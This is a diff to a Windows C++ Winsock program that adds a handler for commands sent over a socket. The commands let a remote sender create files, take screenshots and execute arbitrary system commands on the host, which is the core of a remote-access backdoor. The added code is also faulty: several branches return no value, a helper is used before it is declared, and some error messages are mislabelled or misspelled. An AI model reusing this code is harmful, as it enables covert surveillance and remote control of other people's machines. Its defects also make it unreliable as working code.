@@ -3,7 +3,8 @@
 #include <Windows.h>
 #include <iostream>
 #include <string>
-
+#include <fstream>
+#include "customtools.h"
 
 WSADATA Winsockdata;
 int     iWsaStartup;
@@ -189,4 +190,77 @@ void UDF_WSACleanup() {
 	iWsaCleanup = WSACleanup();
 	if (iWsaCleanup == SOCKET_ERROR) std::cout << "Cleanup Func Failed! Error no: " << WSAGetLastError() << std::endl;
 	else std::cout << "WSACleanup Func Success!" << std::endl;
+}
+
+std::string CommandsHandler(std::string msg) {
+
+	if (msg.find("help") == 0) {
+		std::string help = "Help Commands:\n\t";
+		help.append("help\n\t");
+		help.append("create [FileName] in [Directory]\n\t");
+		help.append("screenshot [FileName] in [Directory]\n\t");
+
+		return help;
+	}
+	else if (msg.find("create") == 0) {
+		//std::cout << "create [FileName] in [Directory]" << std::endl;
+		if (msg.find(" ") == 6) {
+			int splitPoint = msg.find(" in ");
+			if (splitPoint == std::string::npos) return "Invalid Syntax";
+			std::string fileName = split(msg, 7, splitPoint);
+			//std::cout << "File Name: >" << fileName << "<" << std::endl; // debuging line
+			splitPoint += 4;
+			if (splitPoint >= msg.length()) return "Invalid Syntax";
+			std::string loc = split(msg, splitPoint, msg.length());
+			std::string path = loc;
+			path.append(fileName);
+			std::ofstream file(path);
+			if (file.is_open()) {
+				file.close();
+			}
+			else {
+				return "File filed to create";
+			}
+			//std::cout << "Location: >" << loc << "<" << std::endl; // debuging line
+		}
+		else {
+			return "Invalid Syntax of create cmd";
+		}
+	}
+	else if (msg.find("screenshot") == 0) {
+		if (msg.find(" ") == 10) {
+			int splitPoint = msg.find(" in ");
+			if (splitPoint == std::string::npos) return "Invalid Syntax";
+			std::string fileName = split(msg, 11, splitPoint);
+			splitPoint += 4;
+			if (splitPoint >= msg.length()) return "Invalid Syntax";
+			std::string loc = split(msg, splitPoint, msg.length());
+			std::string path = loc;
+			path.append(fileName);
+			TakeScreenShot(path);
+		}
+		else {
+			return "Invalid Syntax of create cmd";
+		}
+	}
+	else if (msg.find("execute") == 0) {
+		if (msg.find(" ") == 7) {
+			std::string cmd = split(msg, 8, msg.length());
+			exec(cmd);
+		}
+	}
+
+
+
+	else {
+		return "Invalid Syntax";
+	}
+}
+
+std::string split(std::string str, int from, int to) {
+	std::string subStr;
+	for (int i = from; i < to; i++) {
+		subStr += str.at(i);
+	}
+	return subStr;
 }
